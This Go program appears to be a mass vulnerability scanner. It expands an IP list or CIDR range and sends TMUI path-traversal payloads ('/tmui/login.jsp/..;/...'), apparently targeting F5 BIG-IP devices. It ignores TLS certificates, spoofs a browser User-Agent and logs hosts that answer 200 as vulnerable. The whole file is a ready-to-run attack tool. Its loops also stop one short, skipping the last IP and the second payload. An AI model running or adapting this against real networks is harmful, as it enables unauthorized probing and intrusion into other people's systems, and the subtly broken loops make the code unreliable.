package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"github.com/jamiealquiza/cidrxpndr"
)

var ip_list []string

func main() {
	var ipfile string
	var ips string
	flag.StringVar(&ipfile, "f", "", "IP文件名:一行一个")
	flag.StringVar(&ips, "i", "", "IP段:如:127.0.0.1/24")
	flag.Parse()
	if ipfile != "" && ips != "" {
		fmt.Print("-f和-i不能同时使用")
		os.Exit(0)
	} else if ipfile != "" {
		list(ipfile)
	} else if ips != "" {
		ip_list, _ = cidrxpndr.Expand(ips)
	} else {
		fmt.Println("please use -h or -i or -f")
	}
	scan(ip_list)
}

func scan(iplist []string) {
	var payload [2]string
	payload[0] = "/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp"
	payload[1] = "/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=hello"
	for i := 0; i < len(iplist)-1; i++ {
		line := i + 1
		liness := len(iplist) - 1
		lines := strconv.Itoa(line)
		linesss := strconv.Itoa(liness)
		for j := 0; j < len(payload)-1; j++ {
			url := "https://" + iplist[i] + payload[j]
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
			client := &http.Client{Transport: tr}
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				fmt.Println("失败!" + ":" + url + ":" + err.Error())
				break
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			fmt.Println(lines + "/" + linesss + "--------" + url)
			response, err := client.Do(req)
			if err != nil {
				fmt.Println(url + "主机不存活")
				writer(iplist[i], "no", "")
				writer(iplist[i], "ok", "")
				break
			} else if response.StatusCode == 200 {
				fmt.Println("    " + url + "存在漏洞")
				writer(iplist[i], "ola", payload[j])
				writer(iplist[i], "ok", "")
				break
			} else {
				fmt.Println(url + "不存在漏洞!")
				writer(iplist[i], "ok", "")
			}
		}
	}
}

func writer(ip string, status string, payload string) {
	ok, _ := os.OpenFile("已完成.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	ola, _ := os.OpenFile("存在漏洞.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ola.Close()
	no, _ := os.OpenFile("不存活.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer no.Close()
	switch status {
	case "ok":
		ok.Write([]byte(ip + "\n"))
	case "no":
		no.Write([]byte(ip + "\n"))
	case "ola":
		ola.Write([]byte(ip + "\n"))
	}
}

func list(ipfile string) {
	ip_file, err := os.Open(ipfile)
	if err != nil {
		fmt.Print("文件打开失败,请确认存放IP文件的路径,文件名是否正确!\n")
		os.Exit(0)
	}
	defer ip_file.Close()
	readerip := bufio.NewReader(ip_file)
	for {
		ip, err := readerip.ReadString('\n')
		ip = strings.Replace(ip, " ", "", -1)
		ip = strings.Replace(ip, "\n", "", -1)
		ip = strings.Replace(ip, "\r", "", -1)
		ip_list = append(ip_list, ip)
		if err == io.EOF {
			break
		}
	}
}
